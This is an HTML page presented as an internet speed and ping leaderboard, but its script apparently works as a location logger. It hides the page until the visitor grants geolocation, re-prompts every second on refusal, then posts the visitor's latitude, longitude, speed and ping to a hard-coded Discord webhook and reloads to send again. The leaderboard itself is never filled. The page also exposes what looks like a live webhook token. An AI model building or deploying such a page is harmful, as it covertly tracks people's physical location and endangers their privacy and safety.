<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leaderboard</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; margin: 0; }
        #a { display: none; }
        .e { color: red; font-size: 18px; margin-top: 50px; }
        .c { font-size: 18px; margin-top: 50px; }
        #i { margin-top: 20px; width: 80%; margin-left: 10%; border-collapse: collapse; }
        #i th, #i td { border: 1px solid #ddd; padding: 8px; }
        #i th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <div id="a">
        <header>
            <h1>Leaderboard: Internet Speed and Ping</h1>
        </header>
        <div class="d">
            <p><strong>Disclaimer:</strong> Your location, internet speed, and ping are being captured for performance analysis.</p>
        </div>
        <div class="e">
            <p><strong>Your Location:</strong> <span id="f">Loading...</span></p>
            <p><strong>Internet Speed:</strong> <span id="g">Loading...</span></p>
            <p><strong>Ping:</strong> <span id="h">Loading...</span></p>
        </div>
        <table id="i">
            <thead>
                <tr>
                    <th>Rank</th>
                    <th>Internet Speed (Mbps)</th>
                    <th>Ping (ms)</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
    </div>
    <p id="j" class="e" style="display:none;">Location access is required to use this site.</p>
    <p id="k" class="c" style="display:none;">Requesting location access...</p>

    <script>
        // Replace with your actual webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1336044790646571100/p4HcckTNGA-ByqvM64Nn2qwPz7fP1tIm-naVtwxoqF56-lx6_RkZUI1djZW2vDAWPTRM";

        // Function to send data to the Discord webhook
        function sendToWebhook(location, speed, ping) {
            const payload = {
                content: `Location: Latitude: ${location.lat}, Longitude: ${location.lon}`,
                embeds: [
                    {
                        title: "Network Data",
                        fields: [
                            { name: "Internet Speed", value: `${speed} Mbps`, inline: true },
                            { name: "Ping", value: `${ping} ms`, inline: true }
                        ]
                    }
                ]
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        }

        // Function to update internet speed and ping
        function updateNetworkStats() {
            let speed = "Unavailable";
            let ping = "Unavailable";
            if (navigator.connection) {
                speed = navigator.connection.downlink || "Unavailable";
                ping = navigator.connection.rtt || "Unavailable";
            }
            document.getElementById('g').textContent = `${speed} Mbps`;
            document.getElementById('h').textContent = `${ping} ms`;
        }

        // Function to request the user's location and refresh once granted
        function requestLocation() {
            document.getElementById('k').style.display = "block"; // Show "Requesting location access..." message
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // Successfully got the location
                    document.getElementById('k').style.display = "none"; // Hide loading message
                    document.getElementById('j').style.display = "none"; // Hide location error message
                    document.getElementById('a').style.display = "block"; // Show the leaderboard content

                    // Store the location coordinates
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    document.getElementById('f').textContent = `Latitude: ${lat}, Longitude: ${lon}`;

                    // Get network stats (internet speed and ping)
                    updateNetworkStats();

                    // Send the data to the Discord webhook
                    sendToWebhook({lat, lon}, navigator.connection.downlink, navigator.connection.rtt);

                    // Refresh the page after 3 seconds
                    setTimeout(function() {
                        location.reload();
                    }, 3000);
                }, function() {
                    // Failed to get location, ask again
                    document.getElementById('k').style.display = "none"; // Hide loading message
                    document.getElementById('j').style.display = "block"; // Show location error message
                    setTimeout(requestLocation, 1000); // Keep asking for location every second
                });
            } else {
                document.getElementById('k').style.display = "none"; // Hide loading message
                document.getElementById('j').style.display = "block"; // Show location error message
                setTimeout(requestLocation, 1000); // Keep asking for location every second
            }
        }

        // Start the location request process
        requestLocation();
    </script>
</body>
</html>
